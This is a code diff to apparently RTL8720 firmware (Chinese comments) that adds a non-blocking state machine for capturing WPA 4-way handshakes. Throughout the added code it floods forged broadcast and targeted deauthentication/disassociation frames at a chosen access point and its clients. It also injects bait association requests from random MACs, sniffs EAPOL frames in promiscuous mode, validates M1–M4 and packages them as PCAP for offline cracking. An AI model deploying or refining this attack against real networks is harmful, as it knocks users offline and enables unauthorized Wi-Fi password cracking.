@@ -170,6 +170,29 @@ static int g_captureMode = CAPTURE_MODE_ACTIVE;
 // Control whether capture flow actively sends deauth/disassoc during sniff (ACTIVE only)
 static bool g_captureDeauthEnabled = true;
 
+// 抓包状态机定义
+enum CaptureState {
+  CAPTURE_STATE_IDLE,           // 空闲
+  CAPTURE_STATE_INIT,           // 初始化
+  CAPTURE_STATE_PRE_DEAUTH,     // 预先诱发解除认证
+  CAPTURE_STATE_DEAUTH_PHASE,   // 去认证阶段
+  CAPTURE_STATE_SNIFF_PHASE,    // 嗅探阶段
+  CAPTURE_STATE_EFFICIENT_BURST,// 高效模式突发
+  CAPTURE_STATE_MGMT_CAPTURE,   // 管理帧捕获
+  CAPTURE_STATE_COMPLETE        // 完成
+};
+
+// 状态机变量
+static CaptureState g_captureState = CAPTURE_STATE_IDLE;
+static unsigned long g_captureStateStartTime = 0;
+static unsigned long g_overallCaptureStartTime = 0;
+static int g_captureAttempts = 0;
+static unsigned long g_lastBurstTime = 0;
+static unsigned long g_lastChannelCheckTime = 0;
+static unsigned long g_preDeauthPacketCount = 0;
+static unsigned long g_deauthPacketCount = 0;
+static bool g_promiscEnabled = false;
+
 // (helper already defined above)
 
 struct HandshakeFrame {
@@ -503,6 +526,7 @@ void resetGlobalHandshakeData() {
 
 // 检查握手包完整性的函数声明
 bool isHandshakeComplete();
+bool isHandshakeCompleteQuickCapture();
 bool hasBothHandshakeDirections();
 
 void printHandshakeData() {
@@ -612,7 +636,7 @@ void printHandshakeData() {
   Serial.println(F("---- End of Handshake Data ----"));
 }
 
-void deauthAndSniff() {
+void deauthAndSniff_legacy() {
   sniffer_active = true;
   // Reset capture buffers.
   resetCaptureData();
@@ -993,6 +1017,538 @@ void deauthAndSniff() {
   hs_sniffer_running = false;
 }
 
+// 启动非阻塞抓包（初始化）
+void deauthAndSniff() {
+  sniffer_active = true;
+  // Reset capture buffers.
+  resetCaptureData();
+
+  // 停止现有的数据包侦测功能以避免冲突
+  if (g_verboseHandshakeLog) Serial.println(F("Stopping existing packet detection..."));
+  wifi_set_promisc(RTW_PROMISC_DISABLE, NULL, 1);
+  
+  // 确保WiFi处于正确的状态
+  WiFi.disablePowerSave(); // 关闭省电模式以确保稳定的数据包捕获
+
+  memcpy(deauth_bssid, _selectedNetwork.bssid, 6);
+  
+  // 输出目标网络信息用于调试
+  if (g_verboseHandshakeLog) {
+    Serial.print(F("Target network: "));
+    Serial.print(_selectedNetwork.ssid);
+    Serial.print(F(" ("));
+    Serial.print(macToString(_selectedNetwork.bssid, 6));
+    Serial.print(F(") on channel "));
+    Serial.println(_selectedNetwork.ch);
+  }
+  
+  // 检查目标网络是否有效
+  if (_selectedNetwork.ch == 0 || _selectedNetwork.ssid == "") {
+    Serial.println(F("ERROR: Invalid target network selected!"));
+    sniffer_active = false;
+    readyToSniff = false;
+    return;
+  }
+  
+  // Set the channel to the target AP's channel.
+  if (g_verboseHandshakeLog) { Serial.print(F("Setting channel to: ")); Serial.println(_selectedNetwork.ch); }
+  int channelResult = wext_set_channel(WLAN0_NAME, _selectedNetwork.ch);
+  if (g_verboseHandshakeLog) { Serial.print(F("Channel set result: ")); Serial.println(channelResult); }
+  
+  // 启动状态机
+  g_captureState = CAPTURE_STATE_INIT;
+  g_captureStateStartTime = millis();
+  g_overallCaptureStartTime = millis();
+  g_captureAttempts = 0;
+  g_preDeauthPacketCount = 0;
+  g_deauthPacketCount = 0;
+  g_promiscEnabled = false;
+  g_lastBurstTime = 0;
+  g_lastChannelCheckTime = 0;
+  
+  Serial.println(F("[NonBlocking] Capture state machine initialized"));
+}
+
+// 非阻塞抓包主循环（由主程序循环调用）
+void deauthAndSniff_update() {
+  if (g_captureState == CAPTURE_STATE_IDLE) return;
+  
+  unsigned long currentTime = millis();
+  
+  // 检查总体超时
+  if (currentTime - g_overallCaptureStartTime > 60000) {
+    Serial.println(F("[NonBlocking] Overall timeout reached"));
+    g_captureState = CAPTURE_STATE_COMPLETE;
+    return;
+  }
+  
+  // 根据状态执行相应操作
+  switch (g_captureState) {
+    case CAPTURE_STATE_IDLE:
+      // 空闲状态，直接返回
+      return;
+      
+    case CAPTURE_STATE_INIT:
+      // WiFi配置、频道设置、启动混杂模式
+      if (currentTime - g_captureStateStartTime > 200) {
+        // Enable promiscous mode BUT keep SoftAP active
+        if (g_verboseHandshakeLog) Serial.println(F("Enabling promiscuous mode for handshake capture..."));
+        int promiscResult = wifi_set_promisc(RTW_PROMISC_ENABLE_2, rtl8720_sniff_callback, 1);
+        if (g_verboseHandshakeLog) { Serial.print(F("Promiscuous mode result: ")); Serial.println(promiscResult); }
+        
+        g_promiscEnabled = true;
+        g_promiscEnabledMs = millis();
+        
+        // 主动诱发（在严格模式下关闭，避免引入伪客户端导致误判）
+        if (!strictCaptureMode) {
+          uint8_t baitSta[6];
+          baitSta[0] = 0x02; // locally administered, unicast
+          baitSta[1] = random(256);
+          baitSta[2] = random(256);
+          baitSta[3] = random(256);
+          baitSta[4] = random(256);
+          baitSta[5] = random(256);
+          addKnownClient(baitSta);
+          Serial.print(F("[Bait] Send auth/assoc from STA ")); Serial.println(macToString(baitSta,6));
+          // 发送认证与关联请求
+          wifi_tx_auth_req(baitSta, _selectedNetwork.bssid);
+          delay(10);
+          wifi_tx_assoc_req(baitSta, _selectedNetwork.bssid, _selectedNetwork.ssid.c_str());
+        }
+        
+        // 转换到预先诱发状态
+        g_captureState = CAPTURE_STATE_PRE_DEAUTH;
+        g_captureStateStartTime = currentTime;
+        Serial.println(F("[NonBlocking] Entering PRE_DEAUTH state"));
+      }
+      break;
+      
+    case CAPTURE_STATE_PRE_DEAUTH:
+      // 发送预先解除认证帧（分批，每次调用发送少量）
+      if (g_captureMode != CAPTURE_MODE_PASSIVE) {
+        // 组合常见原因码，分批次发送
+        const uint16_t reasons[] = {7, 1};
+        for (int r = 0; r < 2; r++) {
+          // 每个原因码发送若干帧（适度控制总量，避免长时间阻塞）
+          wifi_tx_broadcast_deauth(deauth_bssid, reasons[r], 30, 200); // 减少每次发送量
+          g_preDeauthPacketCount += 30;
+        }
+        // 少量解除关联帧
+        wifi_tx_broadcast_disassoc(deauth_bssid, 8, 5, 300); // 减少发送量
+        g_preDeauthPacketCount += 5;
+        
+        // 等待AP与STA侧状态收敛：高效模式 2000ms，其它模式 3000ms
+        unsigned long waitTime = (g_captureMode == CAPTURE_MODE_EFFICIENT) ? 2000 : 3000;
+        if (currentTime - g_captureStateStartTime > waitTime) {
+          g_captureState = CAPTURE_STATE_DEAUTH_PHASE;
+          g_captureStateStartTime = currentTime;
+          Serial.println(F("[NonBlocking] Entering DEAUTH_PHASE state"));
+        }
+      } else {
+        Serial.println(F("[Deauth] Skipping pre-deauth (PASSIVE mode)"));
+        g_captureState = CAPTURE_STATE_DEAUTH_PHASE;
+        g_captureStateStartTime = currentTime;
+      }
+      break;
+      
+    case CAPTURE_STATE_DEAUTH_PHASE:
+      // 持续1.5秒，每次调用发送少量deauth帧
+      if (g_captureMode == CAPTURE_MODE_ACTIVE) {
+        if (currentTime - g_captureStateStartTime < 1500) {
+          // 减少频道切换频率以避免影响WebUI连接
+          if (currentTime - g_lastChannelCheckTime > 1000) { // 每1秒检查一次频道
+            wext_set_channel(WLAN0_NAME, _selectedNetwork.ch);
+            g_lastChannelCheckTime = currentTime;
+          }
+          
+          // Pause capture while sending deauth
+          pauseCaptureForDeauth();
+          
+          if (g_verboseHandshakeLog) { Serial.print(F("Target BSSID: ")); Serial.println(macToString(deauth_bssid, 6)); }
+          
+          const int maxDeauthPerCall = 50; // 每次调用最多发送50帧
+          int sentThisCall = 0;
+          
+          // 在去认证阶段保留更长时间窗口，避免刚学到的客户端被过早淘汰
+          pruneStaleKnownClients(15000);
+          
+          if (knownClientCount > 0) {
+            DeauthFrame frame;
+            memcpy(&frame.source, deauth_bssid, 6);
+            memcpy(&frame.access_point, deauth_bssid, 6);
+            // 降低日志噪声，避免影响抓包
+            uint8_t localKnownCount = knownClientCount; if (localKnownCount > 8) localKnownCount = 8;
+            for (uint8_t k = 0; k < localKnownCount && sentThisCall < maxDeauthPerCall; k++) {
+              const uint8_t *sta = (const uint8_t*)knownClients[k];
+              memcpy(&frame.destination, sta, 6);
+              // 对已知客户端发送小型突发：多原因码组合，提高兼容性
+              const uint16_t reasons[3] = {7, 1, 4};
+              for (int r = 0; r < 3 && sentThisCall < maxDeauthPerCall; r++) {
+                frame.reason = reasons[r];
+                for (int i = 0; i < 2 && sentThisCall < maxDeauthPerCall; i++) { 
+                  wifi_tx_raw_frame(&frame, sizeof(DeauthFrame)); 
+                  sentThisCall++; 
+                  delayMicroseconds(200); 
+                }
+              }
+            }
+          } else {
+            // 无已知客户端：使用极轻量的广播去认证/解除关联唤醒STA，便于后续学习
+            // 控制发送量，避免影响抓包与AP稳定性
+            const uint16_t reasonsD[2] = {7, 1};
+            for (int r = 0; r < 2 && sentThisCall < maxDeauthPerCall; r++) {
+              wifi_tx_broadcast_deauth(deauth_bssid, reasonsD[r], 1, 500);
+              sentThisCall += 1;
+            }
+            // 可选：一次轻量解除关联
+            wifi_tx_broadcast_disassoc(deauth_bssid, 8 /*inactivity*/, 1, 500);
+            sentThisCall += 1;
+          }
+          
+          g_deauthPacketCount += sentThisCall;
+          
+          // Resume capture quickly to avoid missing immediate M1
+          resumeCaptureAfterDeauth(120);
+          wext_set_channel(WLAN0_NAME, _selectedNetwork.ch);
+        } else {
+          // 去认证阶段完成，进入嗅探阶段
+          g_captureState = CAPTURE_STATE_SNIFF_PHASE;
+          g_captureStateStartTime = currentTime;
+          Serial.println(F("[NonBlocking] Entering SNIFF_PHASE state"));
+        }
+      } else {
+        Serial.println(F("[Deauth] Skipping deauth phase (non-ACTIVE mode)"));
+        g_captureState = CAPTURE_STATE_SNIFF_PHASE;
+        g_captureStateStartTime = currentTime;
+      }
+      break;
+      
+    case CAPTURE_STATE_SNIFF_PHASE: {
+      // 持续7-15秒（根据模式），每300ms执行一次小突发deauth（主动模式）
+      unsigned long sniffInterval = (g_captureMode == CAPTURE_MODE_EFFICIENT) ? 15000 : 7000;
+      
+      if (currentTime - g_captureStateStartTime < sniffInterval) {
+        // 减少频道切换频率以避免影响WebUI连接
+        if (currentTime - g_lastChannelCheckTime > 1000) { // 每1秒检查一次频道
+          wext_set_channel(WLAN0_NAME, _selectedNetwork.ch);
+          g_lastChannelCheckTime = currentTime;
+        }
+        
+        // 突发解除认证帧（抓包间隙）：周期性小突发，不中断混杂模式（仅主动模式）
+        if (g_captureMode == CAPTURE_MODE_ACTIVE && g_captureDeauthEnabled && (currentTime - g_lastBurstTime >= 300)) {
+          g_lastBurstTime = currentTime;
+          pruneStaleKnownClients(6000);
+          // Pause capture for deauth burst during sniff
+          pauseCaptureForDeauth();
+          // 优先定向：已知客户端时，每个STA发少量解除认证帧
+          if (knownClientCount > 0) {
+            DeauthFrame frame;
+            memcpy(&frame.source, deauth_bssid, 6);
+            memcpy(&frame.access_point, deauth_bssid, 6);
+            uint8_t localKnownCount = knownClientCount; if (localKnownCount > 8) localKnownCount = 8;
+            for (uint8_t k = 0; k < localKnownCount; k++) {
+              const uint8_t *sta = (const uint8_t*)knownClients[k];
+              memcpy(&frame.destination, sta, 6);
+              // 多个常见原因码，小突发
+              const uint16_t reasons[3] = {7, 1, 4};
+              for (int r = 0; r < 3; r++) { 
+                frame.reason = reasons[r]; 
+                for (int i = 0; i < 2; i++) { 
+                  wifi_tx_raw_frame(&frame, sizeof(DeauthFrame)); 
+                  delayMicroseconds(200); 
+                } 
+              }
+            }
+          } else {
+            // 无已知客户端：更保守的AP采取更稀疏的广播推动（每3秒一次，最多1帧）
+            static unsigned long lastNoClientBroadcastTs = 0;
+            if (currentTime - lastNoClientBroadcastTs > 3000) {
+              lastNoClientBroadcastTs = currentTime;
+              wifi_tx_broadcast_deauth(deauth_bssid, 7, 1, 1000);
+            }
+          }
+          // Resume capture quickly to avoid missing immediate EAPOL
+          resumeCaptureAfterDeauth(120);
+          wext_set_channel(WLAN0_NAME, _selectedNetwork.ch);
+        }
+        
+        // 动态敏感度：当捕获到 M1 或 M3（AP->STA方向且含ACK），适度延长本轮嗅探时间
+        bool extend = false;
+        for (unsigned int i = 0; i < capturedHandshake.frameCount; i++) {
+          ParsedEapolInfo einfo;
+          bool p = parseEapol(capturedHandshake.frames[i].data, capturedHandshake.frames[i].length, einfo);
+          if (!p) p = parseEapolFromEthertype(capturedHandshake.frames[i].data, capturedHandshake.frames[i].length, einfo);
+          if (p) {
+            bool m1 = einfo.isFromAP && einfo.descriptorType == 0x02 && einfo.hasAck && !einfo.hasMic && !einfo.hasInstall;
+            bool m3 = einfo.isFromAP && einfo.hasMic && einfo.hasAck && einfo.hasInstall;
+            if (m1 || m3) { extend = true; break; }
+          }
+        }
+        if (extend && sniffInterval < 10000) { sniffInterval = 10000; }
+        
+        if (hasBothHandshakeDirections() && capturedManagement.frameCount < 3) {
+          if (g_verboseHandshakeLog) Serial.println(F("Early management capture trigger: both directions seen, switching to management capture..."));
+          g_captureState = CAPTURE_STATE_MGMT_CAPTURE;
+          g_captureStateStartTime = currentTime;
+          break;
+        }
+        // 最小嗅探时间门限：至少嗅探1.5秒才允许判定完成
+        if ((currentTime - g_captureStateStartTime) >= 1500UL && isHandshakeComplete()) {
+          if (g_verboseHandshakeLog) Serial.println(F("Complete 4-way handshake detected (after min sniff time), exiting sniff phase early"));
+          // 生成握手包数据
+          std::vector<uint8_t> pcapData = generatePcapBuffer();
+          if (g_verboseHandshakeLog) { Serial.print(F("PCAP size: ")); Serial.print(pcapData.size()); Serial.println(F(" bytes")); }
+          globalPcapData = pcapData;
+          // 设置握手包捕获标志
+          isHandshakeCaptured = true;
+          handshakeDataAvailable = true;
+          // 记录统计与时间
+          lastCaptureTimestamp = millis();
+          lastCaptureHSCount = (uint8_t)capturedHandshake.frameCount;
+          lastCaptureMgmtCount = (uint8_t)capturedManagement.frameCount;
+          handshakeJustCaptured = true;
+          g_captureState = CAPTURE_STATE_MGMT_CAPTURE;
+          g_captureStateStartTime = currentTime;
+          break;
+        }
+        
+        // 实时检查：如果已经捕获到足够的帧，立即验证并设置标志
+        if (capturedHandshake.frameCount >= 4 && capturedManagement.frameCount >= 3) {
+          if (isHandshakeComplete()) {
+            Serial.println(F("[NonBlocking] Complete handshake detected during sniff, setting flags"));
+            // 生成握手包数据
+            std::vector<uint8_t> pcapData = generatePcapBuffer();
+            if (g_verboseHandshakeLog) { Serial.print(F("PCAP size: ")); Serial.print(pcapData.size()); Serial.println(F(" bytes")); }
+            globalPcapData = pcapData;
+            // 设置握手包捕获标志
+            isHandshakeCaptured = true;
+            handshakeDataAvailable = true;
+            // 记录统计与时间
+            lastCaptureTimestamp = millis();
+            lastCaptureHSCount = (uint8_t)capturedHandshake.frameCount;
+            lastCaptureMgmtCount = (uint8_t)capturedManagement.frameCount;
+            handshakeJustCaptured = true;
+            g_captureState = CAPTURE_STATE_COMPLETE;
+            break;
+          }
+        }
+      } else {
+        // 嗅探阶段完成，先检查是否已经有完整的握手包
+        if (capturedHandshake.frameCount >= 4 && capturedManagement.frameCount >= 3) {
+          if (isHandshakeCompleteQuickCapture()) {
+            Serial.println(F("[NonBlocking] Complete handshake detected at sniff phase end, setting flags"));
+            // 生成握手包数据
+            std::vector<uint8_t> pcapData = generatePcapBuffer();
+            if (g_verboseHandshakeLog) { Serial.print(F("PCAP size: ")); Serial.print(pcapData.size()); Serial.println(F(" bytes")); }
+            globalPcapData = pcapData;
+            // 设置握手包捕获标志
+            isHandshakeCaptured = true;
+            handshakeDataAvailable = true;
+            // 记录统计与时间
+            lastCaptureTimestamp = millis();
+            lastCaptureHSCount = (uint8_t)capturedHandshake.frameCount;
+            lastCaptureMgmtCount = (uint8_t)capturedManagement.frameCount;
+            handshakeJustCaptured = true;
+            g_captureState = CAPTURE_STATE_COMPLETE;
+            Serial.println(F("[NonBlocking] Entering COMPLETE state"));
+          } else {
+            Serial.println(F("[NonBlocking] Invalid handshake detected, clearing stats and restarting"));
+            // 清空统计重新开始抓包
+            resetCaptureData();
+            resetGlobalHandshakeData();
+            // 重新启动抓包状态机
+            g_captureState = CAPTURE_STATE_INIT;
+            g_captureStateStartTime = currentTime;
+            Serial.println(F("[NonBlocking] Restarting capture state machine"));
+          }
+        } else if ((isHandshakeCompleteQuickCapture() || (capturedHandshake.frameCount >= 2 && hasBothHandshakeDirections())) && capturedManagement.frameCount < 3) {
+          g_captureState = CAPTURE_STATE_MGMT_CAPTURE;
+          g_captureStateStartTime = currentTime;
+          Serial.println(F("[NonBlocking] Entering MGMT_CAPTURE state"));
+        } else if (g_captureMode == CAPTURE_MODE_EFFICIENT && !isHandshakeComplete()) {
+          g_captureState = CAPTURE_STATE_EFFICIENT_BURST;
+          g_captureStateStartTime = currentTime;
+          Serial.println(F("[NonBlocking] Entering EFFICIENT_BURST state"));
+        } else {
+          g_captureState = CAPTURE_STATE_COMPLETE;
+          Serial.println(F("[NonBlocking] Entering COMPLETE state"));
+        }
+      }
+      break;
+    }
+      
+    case CAPTURE_STATE_EFFICIENT_BURST:
+      // 高效模式：窗口结束后若未完成，则暂停抓包 -> 突发解除认证 -> 等待2s -> 继续抓包
+      if (!isHandshakeComplete()) {
+        pauseCaptureForDeauth();
+        const uint16_t reasonsE[2] = {7, 1};
+        for (int r = 0; r < 2; r++) { 
+          wifi_tx_broadcast_deauth(deauth_bssid, reasonsE[r], 40, 150); // 减少发送量
+        }
+        wifi_tx_broadcast_disassoc(deauth_bssid, 8, 5, 200); // 减少发送量
+        // 尽快恢复混杂模式，避免错过随后的EAPOL（将原2000ms离线等待改为在线等待）
+        resumeCaptureAfterDeauth(100);
+        wext_set_channel(WLAN0_NAME, _selectedNetwork.ch);
+        
+        // 等待1.9秒后重新进入嗅探阶段
+        if (currentTime - g_captureStateStartTime > 1900) {
+          g_captureState = CAPTURE_STATE_SNIFF_PHASE;
+          g_captureStateStartTime = currentTime;
+          Serial.println(F("[NonBlocking] Re-entering SNIFF_PHASE state"));
+        }
+      } else {
+        g_captureState = CAPTURE_STATE_MGMT_CAPTURE;
+        g_captureStateStartTime = currentTime;
+      }
+      break;
+      
+    case CAPTURE_STATE_MGMT_CAPTURE:
+      // 捕获管理帧，持续最多20秒
+      if (capturedManagement.frameCount < 3 && (currentTime - g_captureStateStartTime < 20000)) {
+        // 每1秒检查一次频道
+        if (currentTime - g_lastChannelCheckTime > 1000) {
+          wext_set_channel(WLAN0_NAME, _selectedNetwork.ch);
+          g_lastChannelCheckTime = currentTime;
+        }
+        
+        // 确保混杂模式启用
+        if (!g_promiscEnabled) {
+          allowAnyMgmtFrames = true;
+          wifi_set_promisc(RTW_PROMISC_DISABLE, NULL, 1);
+          delay(50);
+          wifi_set_promisc(RTW_PROMISC_ENABLE_2, rtl8720_sniff_callback, 1);
+          g_promiscEnabled = true;
+        }
+        
+        // 实时检查：如果已经捕获到足够的帧，立即验证并设置标志
+        if (capturedHandshake.frameCount >= 4 && capturedManagement.frameCount >= 3) {
+          if (isHandshakeComplete()) {
+            Serial.println(F("[NonBlocking] Complete handshake detected during mgmt capture, setting flags"));
+            // 生成握手包数据
+            std::vector<uint8_t> pcapData = generatePcapBuffer();
+            if (g_verboseHandshakeLog) { Serial.print(F("PCAP size: ")); Serial.print(pcapData.size()); Serial.println(F(" bytes")); }
+            globalPcapData = pcapData;
+            // 设置握手包捕获标志
+            isHandshakeCaptured = true;
+            handshakeDataAvailable = true;
+            // 记录统计与时间
+            lastCaptureTimestamp = millis();
+            lastCaptureHSCount = (uint8_t)capturedHandshake.frameCount;
+            lastCaptureMgmtCount = (uint8_t)capturedManagement.frameCount;
+            handshakeJustCaptured = true;
+            allowAnyMgmtFrames = false;
+            g_captureState = CAPTURE_STATE_COMPLETE;
+            break;
+          }
+        }
+      } else {
+        allowAnyMgmtFrames = false;
+        // 管理帧捕获阶段完成，检查是否已经有完整的握手包
+        if (capturedHandshake.frameCount >= 4 && capturedManagement.frameCount >= 3) {
+          if (isHandshakeCompleteQuickCapture()) {
+            Serial.println(F("[NonBlocking] Complete handshake detected at mgmt phase end, setting flags"));
+            // 生成握手包数据
+            std::vector<uint8_t> pcapData = generatePcapBuffer();
+            if (g_verboseHandshakeLog) { Serial.print(F("PCAP size: ")); Serial.print(pcapData.size()); Serial.println(F(" bytes")); }
+            globalPcapData = pcapData;
+            // 设置握手包捕获标志
+            isHandshakeCaptured = true;
+            handshakeDataAvailable = true;
+            // 记录统计与时间
+            lastCaptureTimestamp = millis();
+            lastCaptureHSCount = (uint8_t)capturedHandshake.frameCount;
+            lastCaptureMgmtCount = (uint8_t)capturedManagement.frameCount;
+            handshakeJustCaptured = true;
+          } else {
+            Serial.println(F("[NonBlocking] Invalid handshake detected at mgmt phase end, clearing stats and restarting"));
+            // 清空统计重新开始抓包
+            resetCaptureData();
+            resetGlobalHandshakeData();
+            // 重新启动抓包状态机
+            g_captureState = CAPTURE_STATE_INIT;
+            g_captureStateStartTime = currentTime;
+            Serial.println(F("[NonBlocking] Restarting capture state machine from mgmt phase"));
+            return; // 直接返回，不进入COMPLETE状态
+          }
+        }
+        g_captureState = CAPTURE_STATE_COMPLETE;
+        Serial.println(F("[NonBlocking] Entering COMPLETE state"));
+      }
+      break;
+      
+    case CAPTURE_STATE_COMPLETE:
+      // 完成处理逻辑
+      if (g_verboseHandshakeLog) {
+        Serial.print(F("Current handshake count: "));
+        Serial.print(capturedHandshake.frameCount);
+        Serial.print(F(" / "));
+        Serial.print(MAX_HANDSHAKE_FRAMES);
+        Serial.print(F(", management frames: "));
+        Serial.print(capturedManagement.frameCount);
+        Serial.print(F(" / "));
+        Serial.print(MAX_MANAGEMENT_FRAMES);
+        Serial.print(F(", callback triggered: "));
+        Serial.print(sniffCallbackTriggered ? "YES" : "NO");
+        Serial.print(F(", elapsed time: "));
+        Serial.print((currentTime - g_overallCaptureStartTime) / 1000);
+        Serial.println(F("s"));
+      }
+      
+      // 在检查标志位之前，先验证握手包完整性
+      if (capturedHandshake.frameCount >= 4 && capturedManagement.frameCount >= 3) {
+        Serial.println(F("[NonBlocking] Checking handshake completeness..."));
+        if (isHandshakeCompleteQuickCapture()) {
+          Serial.println(F("[NonBlocking] Handshake completeness verified, setting flags"));
+          // 生成握手包数据
+          std::vector<uint8_t> pcapData = generatePcapBuffer();
+          if (g_verboseHandshakeLog) { Serial.print(F("PCAP size: ")); Serial.print(pcapData.size()); Serial.println(F(" bytes")); }
+          globalPcapData = pcapData;
+          // 设置握手包捕获标志
+          isHandshakeCaptured = true;
+          handshakeDataAvailable = true;
+          // 记录统计与时间
+          lastCaptureTimestamp = millis();
+          lastCaptureHSCount = (uint8_t)capturedHandshake.frameCount;
+          lastCaptureMgmtCount = (uint8_t)capturedManagement.frameCount;
+          handshakeJustCaptured = true;
+        } else {
+          Serial.println(F("[NonBlocking] Invalid handshake detected in complete state, clearing stats and restarting"));
+          // 清空统计重新开始抓包
+          resetCaptureData();
+          resetGlobalHandshakeData();
+          // 重新启动抓包状态机
+          g_captureState = CAPTURE_STATE_INIT;
+          g_captureStateStartTime = currentTime;
+          Serial.println(F("[NonBlocking] Restarting capture state machine from complete state"));
+          return; // 直接返回，不继续完成流程
+        }
+      }
+      
+      // 检查是否成功捕获握手包
+      if (isHandshakeCaptured && handshakeDataAvailable) {
+        Serial.println(F("[NonBlocking] Handshake captured successfully!"));
+        // 抓包完成LED指示
+        extern void completeHandshakeLED();
+        completeHandshakeLED();
+      } else {
+        Serial.println(F("[NonBlocking] Handshake capture failed"));
+      }
+      
+      // 清理状态
+      sniffer_active = false;
+      readyToSniff = false;
+      extern bool hs_sniffer_running;
+      hs_sniffer_running = false;
+      g_captureState = CAPTURE_STATE_IDLE;
+      
+      Serial.println(F("[NonBlocking] Capture state machine completed"));
+      break;
+      
+    default:
+      break;
+  }
+}
+
 // Helper function: extract frame type and subtype from the first two bytes.
 void get_frame_type_subtype(const unsigned char *packet, unsigned int &type, unsigned int &subtype) {
   unsigned short fc = packet[0] | (packet[1] << 8);
@@ -1335,6 +1891,103 @@ bool isHandshakeComplete() {
     return false;
   }
   if (g_verboseHandshakeLog) Serial.println(F("[CHK] Recent AssocResp/ReassocResp within window OK"));
+  return true;
+}
+
+// 快速抓包模式的握手包完整性检查（保持严格验证但移除时间限制）
+bool isHandshakeCompleteQuickCapture() {
+  if (capturedHandshake.frameCount < 2) return false;
+  bool hasMessage1 = false, hasMessage2 = false, hasMessage3 = false, hasMessage4 = false;
+  bool staLocked = false; uint8_t staMac[6] = {0};
+  bool apReplayInit = false, staReplayInit = false; uint8_t apReplayPrev[8] = {0}, staReplayPrev[8] = {0};
+  // 记录通过DS位推导的STA一致性（更可靠）
+  bool staConsistent = true;
+  // 保存M1..M4解析信息以进行回放计数精确校验
+  ParsedEapolInfo mInfos[4]; uint8_t mCount = 0;
+  for (unsigned int i = 0; i < capturedHandshake.frameCount; i++) {
+    ParsedEapolInfo einfo;
+    bool p = parseEapol(capturedHandshake.frames[i].data, capturedHandshake.frames[i].length, einfo);
+    if (!p) p = parseEapolFromEthertype(capturedHandshake.frames[i].data, capturedHandshake.frames[i].length, einfo);
+    if (!p) continue;
+    // 仅接受 Pairwise EAPOL-Key
+    if (!(einfo.descriptorType == 0x02 && ((einfo.keyInfo & (1 << 3)) != 0))) continue;
+    // 每帧派生BSSID必须等于目标
+    const uint8_t *dda,*ssa,*bb;
+    if (!extractAddrsForDataFrame(capturedHandshake.frames[i].data, capturedHandshake.frames[i].length, dda, ssa, bb)) continue;
+    bool bssidOk = true; for (int j=0;j<6;j++){ if (bb[j] != _selectedNetwork.bssid[j]) { bssidOk=false; break; } }
+    if (!bssidOk) continue;
+    // 锁定并校验 STA MAC 一致性（基于DS位提取）
+    const uint8_t *da = &capturedHandshake.frames[i].data[4];
+    const uint8_t *sa = &capturedHandshake.frames[i].data[10];
+    uint16_t fc = capturedHandshake.frames[i].data[0] | (capturedHandshake.frames[i].data[1] << 8);
+    bool toDS = (fc & (1 << 8)) != 0; bool fromDS = (fc & (1 << 9)) != 0;
+    const uint8_t* thisSta = (!toDS && fromDS) ? dda : (toDS && !fromDS) ? ssa : (einfo.isFromAP ? da : sa);
+    if (!staLocked) { for (int j=0;j<6;j++) staMac[j] = thisSta[j]; staLocked = true; }
+    else { bool same=true; for (int j=0;j<6;j++){ if (staMac[j]!=thisSta[j]) { same=false; break; } } if (!same) { staConsistent = false; continue; } }
+    // 严格 M1–M4 Key Info 组合
+    bool m1 = einfo.isFromAP && einfo.hasAck && !einfo.hasMic && !einfo.hasInstall;
+    bool m2 = !einfo.isFromAP && einfo.hasMic && !einfo.hasAck && !einfo.hasInstall;
+    bool m3 = einfo.isFromAP && einfo.hasMic && einfo.hasAck && einfo.hasInstall;
+    bool m4 = !einfo.isFromAP && einfo.hasMic && !einfo.hasAck && !einfo.hasInstall && einfo.hasSecure;
+    // 重放计数单调性（分别对AP与STA方向）
+    if (m1 || m3) {
+      if (apReplayInit) { if (memcmp(einfo.replayCounter, apReplayPrev, 8) < 0) continue; }
+      memcpy(apReplayPrev, einfo.replayCounter, 8); apReplayInit = true;
+    } else if (m2 || m4) {
+      if (staReplayInit) { if (memcmp(einfo.replayCounter, staReplayPrev, 8) < 0) continue; }
+      memcpy(staReplayPrev, einfo.replayCounter, 8); staReplayInit = true;
+    }
+    hasMessage1 = hasMessage1 || m1;
+    hasMessage2 = hasMessage2 || m2;
+    hasMessage3 = hasMessage3 || m3;
+    hasMessage4 = hasMessage4 || m4;
+    if (m1 || m2 || m3 || m4) { if (mCount < 4) mInfos[mCount++] = einfo; }
+  }
+  if (!(staLocked && staConsistent && hasMessage1 && hasMessage2 && hasMessage3 && hasMessage4)) {
+    if (g_verboseHandshakeLog) {
+      Serial.print(F("[QuickCapture-CHK-FAIL] M-set/STA: staLocked=")); Serial.print(staLocked);
+      Serial.print(F(" staConsistent=")); Serial.print(staConsistent);
+      Serial.print(F(" M1-4=")); Serial.print(hasMessage1); Serial.print(hasMessage2); Serial.print(hasMessage3); Serial.println(hasMessage4);
+    }
+    return false;
+  }
+  if (g_verboseHandshakeLog) Serial.println(F("[QuickCapture-CHK] M1-4 present & STA consistent"));
+  // 精确回放计数模式：M1与M2相等，M3与M4均为 M1+1（大端）
+  const uint8_t *rcM1 = nullptr, *rcM2 = nullptr, *rcM3 = nullptr, *rcM4 = nullptr;
+  for (unsigned int i = 0; i < capturedHandshake.frameCount; i++) {
+    ParsedEapolInfo einfo;
+    bool p = parseEapol(capturedHandshake.frames[i].data, capturedHandshake.frames[i].length, einfo);
+    if (!p) p = parseEapolFromEthertype(capturedHandshake.frames[i].data, capturedHandshake.frames[i].length, einfo);
+    if (!p) continue;
+    if (!(einfo.descriptorType == 0x02 && ((einfo.keyInfo & (1 << 3)) != 0))) continue;
+    bool m1 = einfo.isFromAP && einfo.hasAck && !einfo.hasMic && !einfo.hasInstall;
+    bool m2 = !einfo.isFromAP && einfo.hasMic && !einfo.hasAck && !einfo.hasInstall;
+    bool m3 = einfo.isFromAP && einfo.hasMic && einfo.hasAck && einfo.hasInstall;
+    bool m4 = !einfo.isFromAP && einfo.hasMic && !einfo.hasAck && !einfo.hasInstall && einfo.hasSecure;
+    if (m1 && !rcM1) rcM1 = einfo.replayCounter;
+    if (m2 && !rcM2) rcM2 = einfo.replayCounter;
+    if (m3 && !rcM3) rcM3 = einfo.replayCounter;
+    if (m4 && !rcM4) rcM4 = einfo.replayCounter;
+  }
+  if (!(rcM1 && rcM2 && rcM3 && rcM4)) {
+    if (g_verboseHandshakeLog) Serial.println(F("[QuickCapture-CHK-FAIL] Replay pointers missing for one or more M1..M4"));
+    return false;
+  }
